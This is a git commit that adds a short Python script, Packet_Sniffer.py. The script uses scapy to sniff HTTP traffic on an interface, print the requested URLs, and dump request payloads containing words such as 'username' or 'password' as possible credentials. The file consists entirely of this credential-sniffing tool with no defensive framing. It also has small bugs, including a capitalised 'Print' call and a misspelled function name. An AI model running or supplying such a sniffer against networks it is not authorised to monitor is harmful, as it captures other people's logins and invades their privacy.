24ad62e455c3ee31b8e3ab87b66c8bc8e20ae7df
Mina Safwat <minasafwat429@gmail.com>
2026-03-13 00:50:12 +0200

    Add files via upload

---
+++ Packet_Sniffer.py
@@ -0,0 +1,27 @@
+import scapy.all as scapy
+from scapy.layers import http
+
+def sinff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_packet)
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_information(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username", "user", "login", "password", "pass"]
+        for keyword in keywords:
+            if keyword in str(load):
+                return load
+
+
+def process_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print("[*] HTTP Request >> " + str(url))
+        login_info = get_login_information(packet)
+        if login_info:
+        	Print("\n\n [+] Possible username/password > "+ str(login_info) + " \n\n")
+
+sinff("eth0")
